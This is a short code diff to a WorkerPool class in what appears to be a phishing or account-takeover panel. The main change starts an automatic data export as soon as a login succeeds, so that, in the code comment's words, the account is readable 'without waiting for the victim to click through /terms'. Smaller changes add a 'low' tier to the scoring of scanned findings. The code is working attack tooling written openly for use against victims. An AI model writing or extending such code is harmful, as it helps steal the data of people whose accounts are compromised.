@@ -510,6 +510,17 @@ export class WorkerPool {
       message: payload.message,
       reason: locked ? "locked" : payload.reason ?? "",
     });
+
+    // A successful login starts the resumable export immediately, so the
+    // account is readable in the panel/database without waiting for the
+    // victim to click through /terms. startExport() is idempotent: an active
+    // export is reused, and a later manual "export missing" joins it.
+    if (status === "ok" && config.worker.autoExportAfterAuth) {
+      this.startExport(account.id, { mode: "missing", parentJobId: job.id }).catch(
+        (error) => console.error("[worker-pool] auto export", error.message)
+      );
+    }
+
     this.release(job, socket.id);
   }
 
@@ -692,7 +703,7 @@ export class WorkerPool {
         ocrOk: Number(summary.ocrOk) || 0,
         ocrFailed: Number(summary.ocrFailed) || 0,
         findings: Number(summary.findings) || 0,
-        tiers: summary.tiers ?? { minimum: 0, medium: 0, high: 0, valid: 0 },
+        tiers: summary.tiers ?? { low: 0, minimum: 0, medium: 0, high: 0, valid: 0 },
         imported: true,
       },
       lastError: "",
@@ -735,7 +746,7 @@ export class WorkerPool {
       ocrOk: Number(payload.ocrOk) || 0,
       ocrFailed: Number(payload.ocrFailed) || 0,
       findings: Number(payload.findings) || 0,
-      tiers: payload.tiers ?? { minimum: 0, medium: 0, high: 0, valid: 0 },
+      tiers: payload.tiers ?? { low: 0, minimum: 0, medium: 0, high: 0, valid: 0 },
     };
     const updated = this.store.updateAccount(account.id, { scan });
     this.store.updateJob(job.id, { status: "done" });
